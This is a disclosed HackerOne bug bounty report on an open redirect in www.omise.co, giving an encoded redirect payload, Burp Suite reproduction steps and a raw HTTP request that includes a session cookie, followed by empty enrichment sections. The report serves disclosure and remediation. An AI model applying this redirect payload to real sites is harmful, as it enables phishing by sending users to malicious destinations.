---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '504751'
original_report_id: '504751'
title: Open Redirect
weakness: Open Redirect
team_handle: omise
created_at: '2019-03-04T11:35:31.036Z'
disclosed_at: '2019-03-25T09:42:19.665Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 66
asset_identifier: www.omise.co
asset_type: URL
max_severity: high
tags:
- hackerone
- open-redirect
---

# Open Redirect

## Metadata

- HackerOne Report ID: 504751
- Weakness: Open Redirect
- Program: omise
- Disclosed At: 2019-03-25T09:42:19.665Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Open Redirect Vulnerability

URL  : https://www.omise.co////bing.com/?www.omise.co/?category=interview&page=2  
 
Parameter Type  : URL Rewrite  

Attack Pattern  : %2f%2f%2fr87.com%2f%3fwww.omise.co%2f  


How to Reproduce

1. Intercept the below url using Burpsuite & send it to repeater

https://www.omise.co/?category=interview&page=2

2. Use this attack pattern 

/%2f%2f%2fbing.com%2f%3fwww.omise.co

3. Now it will redirect to bing.com



Below i will give u the Rquest body & also attaching the screenshots


GET /%2f%2f%2fbing.com%2f%3fwww.omise.co/?category=interview&page=2 HTTP/1.1
Host: www.omise.co
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: _omise-website_session=OHdwcEpSZVUvVXRqS3F3bUVyUUhaZ2pVY00wVWJ1c042RWZZNHdOendwUEkzS0dnaTJPb1hub3ZxcGhkUk5FNy96blpiNjJPL0hhMUZBdS9Jb2ZFY25BcWxzcXNjbTAyclJLTlo0VGUvbzBsa085MXhNUG9uZFpzRnBBeEp4a2MtLU9ONHdIWVBZdWZlS3VIVXVYTVNkOVE9PQ%3D%3D--cf8f4d43247d9eb5aa162a3f00fabc02bbda3b34
Upgrade-Insecure-Requests: 1

## Impact

An attacker can use this vulnerability to redirect users to other malicious websites, which can be used for phishing and similar attacks

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
